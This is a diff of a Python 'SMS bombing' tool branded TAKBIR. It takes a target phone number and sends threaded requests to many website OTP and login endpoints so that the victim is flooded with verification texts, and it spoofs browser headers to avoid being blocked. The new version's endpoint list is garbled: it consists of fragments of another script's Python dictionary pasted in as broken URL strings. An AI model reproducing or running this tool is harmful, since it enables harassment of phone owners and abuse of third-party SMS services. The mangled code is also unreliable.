@@ -1,74 +1,270 @@
 import os, time, threading, requests
 
-# --- Configuration ---
-PASSWORD = "takbir0099"
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Accept': 'application/json',
-    'Referer': 'https://google.com'
-}
+# --- Script Config ---
+TOOL_NAME = "TAKBIR"
+PASSWORD = "1234"
+HEADERS = {'User-Agent': 'Mozilla/5.0'}
 
 def banner():
     os.system("clear" if os.name == "posix" else "cls")
-    print(r"""\033[1;32m
-  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗ 
-  ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║██╔══██╗
-     ██║   ███████║█████╔╝ ██████╔╝██║██████╔╝
-     ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗
-     ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██╗
-     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
-             Takbir Ahmed / PRO BOMBING v3.0
-\033[0m""")
+    print("\033[1;32m" + r""" ████████╗   █████╗   ██╗  ██╗  ██████╗   ██╗  ██████╗  \n ╚══██╔══╝  ██╔══██╗  ██║ ██╔╝  ██╔══██╗  ██║  ██╔══██╗ \n    ██║     ███████║  █████╔╝   ██████╔╝  ██║  ██████╔╝ \n    ██║     ██╔══██║  ██║ ██╗   ██╔══██╗  ██║  ██╔══██╗ \n    ╚═╝     ██║  ██║  ██║  ██╗  ██████╔╝  ██║  ██║  ██╗ """ + "\n" + "="*60 + "\033[0m")
 
-def password_prompt():
-    print("\033[1;31m[!] Tool is locked.\033[0m")
-    if input("Password: ") != PASSWORD:
-        print("Wrong!"); exit()
-    print("\033[1;32m[+] Access Granted!\033[0m")
+def security():
+    print(f"\033[1;31m[!] {TOOL_NAME} IS PROTECTED\033[0m")
+    if input("ENTER PASSWORD: ") != PASSWORD:
+        print("Incorrect!"); exit()
+    print("\033[1;32m[+] ACCESS GRANTED!✔\033[0m")
 
-counter = 0
-lock = threading.Lock()
-
-def update_counter():
-    global counter
-    with lock:
-        counter += 1
-        print(f"\033[1;36m[+ Sent Successfully] Total SMS: {counter}\033[0m")
-
-def send_request(url):
-    try:
-        # এখানে Headers ব্যবহার করা হয়েছে ব্লক এড়াতে
-        res = requests.get(url, headers=HEADERS, timeout=10)
-        if res.status_code == 200:
-            update_counter()
-    except:
-        pass
+def attack(url):
+    try: requests.get(url, headers=HEADERS, timeout=10)
+    except: pass
 
 def start():
     banner()
-    password_prompt()
-    target = input("Target (01XXXXXXXXX): ")
-    if len(target) != 11: print("Invalid!"); return
+    security()
+    target = input("\nTARGET NUMBER: ")
+    amount = int(input("AMOUNT: "))
     
-    number = target
-    amount = int(input("Amount: "))
-    
-    api_list = [
-        {"url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}", "method": "GET"},
+    apis = [
+        {"url": " ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number})," + target, "method": "GET"},
+        {"url": "        'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number})," + target, "method": "GET"},
+        {"url": "        '4hair': ('https://4hair.ir/user/login.php', {'num': '0' + number,'ok':''})," + target, "method": "GET"},
+        {"url": "        'igame': ('https://igame.ir/api/play/otp/send', {'phone': '0' + number})," + target, "method": "GET"},
+        {"url": "        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number})," + target, "method": "GET"},
+        {"url": "        'karlancer': ('https://www.karlancer.com/api/register', {"phone": number,"role": "freelancer"})," + target, "method": "GET"},
+        {"url": "        'hsaria': ('https://www.hsaria.com/MemberRegisterLogin', {"phone": number})," + target, "method": "GET"},
+        {"url": "        'twsms': ('https://twsms.ir/client/register.php', {'mobile': '0' + number,'agree':'agree','sendsms':'1'})," + target, "method": "GET"},
+        {"url": "        'baradarantoy': ('https://baradarantoy.ir/send_confirm_sms_ajax.php', {'user_tel': '0' + number})," + target, "method": "GET"},
+        {"url": "        'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number})," + target, "method": "GET"},
+        {"url": "        'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number})," + target, "method": "GET"},
+        {"url": "        'chechilas': ('https://searchii.ir//controler//phone_otp.php', {'mobile_number': '0' + number,'action':'send_otp','login':'user'})," + target, "method": "GET"},
+        {"url": "        'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number})," + target, "method": "GET"},
+        {"url": "        'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'atlasmode': ('https://api.atlasmode.ir/v1/customer/register-login?version=" + target, "method": "GET"},
+        {"url": "        'pooshakshoniz': ('https://api.pooshakshoniz.com/v1/customer/register-login?version=" + target, "method": "GET"},
+        {"url": "        'ubike': ('https://ubike.ir/index.php?route=" + target, "method": "GET"},
+        {"url": "        'benedito': ('https://api.benedito.ir/v1/customer/register-login?version=" + target, "method": "GET"},
+        {"url": "        'rubeston': ('https://www.rubeston.com/api/customers/login-register', {'mobile': '0' + number,'step':'1'})," + target, "method": "GET"},
+        {"url": "        'primashop': ('https://primashop.ir/index.php?route=" + target, "method": "GET"},
+        {"url": "        'payagym': ('https://payagym.com/wp-admin/admin-ajax.php', {'mobile': '0' + number,'action':'kerasno_proform_register_inline_send'})," + target, "method": "GET"},
+        {"url": "        'bartarinha': ('https://bartarinha.com/Advertisement/Users/RequestLoginMobile', {'mobileNo': '0' + number,'X-Requested-With':'XMLHttpRequest'})," + target, "method": "GET"},
+        {"url": "        'manoshahr': ('https://manoshahr.ir/jq.php', {'mobile': '0' + number,'class_name':'public_login','function_name':'sendCode'})," + target, "method": "GET"},
+        {"url": "        'nalinoco': ('https://www.nalinoco.com/api/customers/login-register', {'mobile': '0' + number,'ReturnUrl':'/','step':'1'})," + target, "method": "GET"},
+        {"url": "        'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php', {'phone_email': '0' + number,'action':'bakala_send_code'})," + target, "method": "GET"},
+        {"url": "        'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php', {'phone': '+98' + number,'form':'register','action':'mobix_send_otp_code'})," + target, "method": "GET"},
+        {"url": "        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number})," + target, "method": "GET"},
+        {"url": "        'martday': ('https://martday.ir/api/customer/member/register/', {'email': '0' + number,'accept_term':'on'})," + target, "method": "GET"},
+        {"url": "        'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=" + target, "method": "GET"},
+        {"url": "        'electrastore': ('https://electrastore.ir/index.php?route=" + target, "method": "GET"},
+        {"url": "        'atrinelec': ('https://www.atrinelec.com/ajax/SendSmsVerfiyCode', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'ketabweb': ('https://ketabweb.com/login/?usernameCheck=" + target, "method": "GET"},
+        {"url": "        'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number})," + target, "method": "GET"},
+        {"url": "        '80w': ('https://80w.ir/wp-admin/admin-ajax.php', {'login': '0' + number,'action':'logini_first'})," + target, "method": "GET"},
+        {"url": "        'noavarpub': ('https://noavarpub.com/logins/login.php?ref=" + target, "method": "GET"},
+        {"url": "        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName=" + target, "method": "GET"},
+        {"url": "        'digighate': ('https://api.digighate.com/v2/public/code?phone=" + target, "method": "GET"},
+        {"url": "        'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number})," + target, "method": "GET"},
+        {"url": "        'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp', {'customer_username': number,'task':'customer_phone'})," + target, "method": "GET"},
+        {"url": "        'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,'login':'1'})," + target, "method": "GET"},
+        {"url": "        'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=" + target, "method": "GET"},
+        {"url": "        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=" + target, "method": "GET"},
+        {"url": "        'ketabium': ('https://www.ketabium.com/login-register', {'username': '0' + number})," + target, "method": "GET"},
+        {"url": "        'rirabook': ('https://rirabook.com/loginAth', {'mobile1': '0' + number,'loginbt1':''})," + target, "method": "GET"},
+        {"url": "        'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number})," + target, "method": "GET"},
+        {"url": "        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number})," + target, "method": "GET"},
+        {"url": "        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number})," + target, "method": "GET"},
+        {"url": "        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number})," + target, "method": "GET"},
+        {"url": "        'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number})," + target, "method": "GET"},
+        {"url": "        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number})," + target, "method": "GET"},
+        {"url": "        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''})," + target, "method": "GET"},
+        {"url": "        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''})," + target, "method": "GET"},
+        {"url": "        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''})," + target, "method": "GET"},
+        {"url": "        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'})," + target, "method": "GET"},
+        {"url": "        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'})," + target, "method": "GET"},
+        {"url": "        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number})," + target, "method": "GET"},
+        {"url": "        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number})," + target, "method": "GET"},
+        {"url": "        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number})," + target, "method": "GET"},
+        {"url": "        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number})," + target, "method": "GET"},
+        {"url": "        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number})," + target, "method": "GET"},
+        {"url": "        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''})," + target, "method": "GET"},
+        {"url": "        'harikashop': ('https://harikashop.com/login?back=" + target, "method": "GET"},
+        {"url": "            'username': '0' + number," + target, "method": "GET"},
+        {"url": "            'id_customer': ''," + target, "method": "GET"},
+        {"url": "            'back': ['', 'https://harikashop.com/login?back=" + target, "method": "GET"},
+        {"url": "            'firstname': 'persian_string'," + target, "method": "GET"},
+        {"url": "            'lastname': 'persian_string'," + target, "method": "GET"},
+        {"url": "            'password': 'random_password'," + target, "method": "GET"},
+        {"url": "            'action': 'register'," + target, "method": "GET"},
+        {"url": "            'ajax': '1'" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'ywp_ajax_register'," + target, "method": "GET"},
+        {"url": "            'ywp_register': '1'," + target, "method": "GET"},
+        {"url": "            'ywp_reg_mobile': '0' + number," + target, "method": "GET"},
+        {"url": "            'ywp_reg_password': 'random_password'," + target, "method": "GET"},
+        {"url": "            'ajax_woocommerce_register_nonce': ''" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {" + target, "method": "GET"},
+        {"url": "            'type': 1," + target, "method": "GET"},
+        {"url": "            'value': '0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {" + target, "method": "GET"},
+        {"url": "            'country_id': 205," + target, "method": "GET"},
+        {"url": "            'mobile': number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'digikalacall': ('https://api.digikala.com/v1/user/authenticate/', {" + target, "method": "GET"},
+        {"url": "            'backUrl': '/'," + target, "method": "GET"},
+        {"url": "            'username': '0' + number," + target, "method": "GET"},
+        {"url": "            'otp_call': 'true'" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {" + target, "method": "GET"},
+        {"url": "            'mobile': '0' + number," + target, "method": "GET"},
+        {"url": "            'deviceTypeCode' :0," + target, "method": "GET"},
+        {"url": "            'confirmTerms': 'true'," + target, "method": "GET"},
+        {"url": "            'notRobot': 'false'," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {" + target, "method": "GET"},
+        {"url": "            'backUrl': '/'," + target, "method": "GET"},
+        {"url": "            'username': '0' + number," + target, "method": "GET"},
+        {"url": "            'otp_call': 'false'" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register'," + target, "method": "GET"},
+        {"url": "            'type': 'mobile'," + target, "method": "GET"},
+        {"url": "            'input': '0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'websima_auth_account_detection'," + target, "method": "GET"},
+        {"url": "            'account_detection_nonce_field': '21737b7e2d'," + target, "method": "GET"},
+        {"url": "            'mobile': '0' + number," + target, "method": "GET"},
+        {"url": "            '_wp_http_referer':'/'" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register'," + target, "method": "GET"},
+        {"url": "            'type': 'mobile'," + target, "method": "GET"},
+        {"url": "            'input': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'bakala_send_code'," + target, "method": "GET"},
+        {"url": "            'phone_email': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'login'," + target, "method": "GET"},
+        {"url": "            'form=" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {" + target, "method": "GET"},
+        {"url": "            'ReturnUrl': 'https://parkbag.com/'," + target, "method": "GET"},
+        {"url": "            'MobaileNumber': number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'digistyle': ('https://www.digistyle.com/users/login-register/', {" + target, "method": "GET"},
+        {"url": "            'loginRegister[email_phone]': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'telketab': ('https://telketab.com/opt_field/check_secret', {" + target, "method": "GET"},
+        {"url": "            'identity': '0' + number," + target, "method": "GET"},
+        {"url": "            'secret': ''," + target, "method": "GET"},
+        {"url": "            'plugin': 'otp_field_sms_processor'," + target, "method": "GET"},
+        {"url": "            'key': 'otp_field_user_auth_form__otp_sms'," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'adinehbook': ('https://www.adinehbook.com/gp/flex/sign-in.html', {" + target, "method": "GET"},
+        {"url": "            'action': 'sign'," + target, "method": "GET"},
+        {"url": "            'phone_cell_or_email': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'gitamehr': ('https://gitamehr.ir/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register'," + target, "method": "GET"},
+        {"url": "            'type': 'mobile'," + target, "method": "GET"},
+        {"url": "            'input': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'sunnybook': ('https://sunnybook.ir/Home/RegisterUser', {" + target, "method": "GET"},
+        {"url": "            'name': 'Mr'," + target, "method": "GET"},
+        {"url": "            'password': '123456'," + target, "method": "GET"},
+        {"url": "            'mobile': number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'mahouney': ('https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {" + target, "method": "GET"},
+        {"url": "            'ReturnUrl': 'https://mahouney.com/'," + target, "method": "GET"},
+        {"url": "            'MobaileNumber': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'myroz': ('https://myroz.ir/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register'," + target, "method": "GET"},
+        {"url": "            'type': 'mobile'," + target, "method": "GET"},
+        {"url": "            'input': '0' + number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'meidane': ('https://meidane.com/accounts/login', {" + target, "method": "GET"},
+        {"url": "            'name': 'Mr'," + target, "method": "GET"},
+        {"url": "            'password': '123456'," + target, "method": "GET"},
+        {"url": "            'mobile': number," + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'ickala': ('https://ickala.com/', {" + target, "method": "GET"},
+        {"url": "            'controller': 'SendSMS','fc':'module'," + target, "method": "GET"},
+        {"url": "            'module': 'loginbymobile','SubmitSmsSend':'1'," + target, "method": "GET"},
+        {"url": "            'ajax': 'true'," + target, "method": "GET"},
+        {"url": "            'otp_mobile_num':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'microele': ('https://www.microele.com/login?back=" + target, "method": "GET"},
+        {"url": "            'id_customer': '','back':',my-account'," + target, "method": "GET"},
+        {"url": "            'firstname': '123','lastname':'123'," + target, "method": "GET"},
+        {"url": "            'password': '123456','action':'register'," + target, "method": "GET"},
+        {"url": "            'username':'0' + number,'ajax':'1'" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'elecmarket': ('https://elecmarket.ir/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register','type':'mobile'," + target, "method": "GET"},
+        {"url": "            'input':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'techsiro': ('https://techsiro.com/send-otp', {" + target, "method": "GET"},
+        {"url": "            'client': 'web','method':'POST','_token':''," + target, "method": "GET"},
+        {"url": "            'mobile':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'noavarpub': ('https://novinparse.com/Page/PageAction.aspx', {" + target, "method": "GET"},
+        {"url": "            'Action': 'SendVerifyCode','verifyCode':'','repeatFlag':'true'," + target, "method": "GET"},
+        {"url": "            'mobile':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'titomarket': ('https://titomarket.com/index.php?route=" + target, "method": "GET"},
+        {"url": "            'redirect': 'https://titomarket.com/my-account'," + target, "method": "GET"},
+        {"url": "            'telephone':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'nikanbike': (f'https://nikanbike.com/?rand=" + target, "method": "GET"},
+        {"url": "            'controller': 'authentication','back':'my-account','fc':'module'," + target, "method": "GET"},
+        {"url": "            'ajax': 'true','module':'iverify'," + target, "method": "GET"},
+        {"url": "            'phone_mobile':'0' + number,'SubmitCheck':''" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "        'account724': ('https://account724.com/wp-admin/admin-ajax.php', {" + target, "method": "GET"},
+        {"url": "            'action': 'stm_login_register'," + target, "method": "GET"},
+        {"url": "            'type': 'mobile'," + target, "method": "GET"},
+        {"url": "            'input':'0' + number" + target, "method": "GET"},
+        {"url": "        })," + target, "method": "GET"},
+        {"url": "    }" + target, "method": "GET"},
+        {"url": "    return list(url_payload_map.values())" + target, "method": "GET"},
+        {"url": " #_______________JSON DATA LINK API ___________________________" + target, "method": "GET"},
+        {"url": "def send_otp_requests_json(number):" + target, "method": "GET"},
+        {"url": "    url2_payload2_map =" + target, "method": "GET"},
+        {"url": "        'eaccount': ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'chortkehshop': ('https://chortkehshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'piinkstore': ('https://piinkstore.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "        'dreamlandshop': ('https://dreamlandshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})," + target, "method": "GET"},
+        {"url": "    }" + target, "method": "GET"},
+        {"url": "    return list(url2_payload2_map.values())" + target, "method": "GET"},
+
     ]
 
-    print("\n\033[1;33m[!] Bombing Started...\033[0m")
-    threads = []
-    
-    for _ in range(amount):
-        for api in api_list:
-            t = threading.Thread(target=send_request, args=(api['url'],))
-            t.start()
-            threads.append(t)
-            time.sleep(0.2) # ওভারলোড এড়াতে সামান্য গ্যাপ
+    if not apis:
+        print("\n\033[1;31m[!] Error: No API links found. Please generate with links.\033[0m")
+        return
 
-    for t in threads: t.join()
-    print("\n\033[1;32m[✔] All Requests Completed!\033[0m")
+    print("\n[!] Attacking started...")
+    for _ in range(amount):
+        for api in apis:
+            threading.Thread(target=attack, args=(api['url'],)).start()
+            time.sleep(0.1)
+    print("\n[✔] DONE!")
 
 if __name__ == "__main__":
     start()
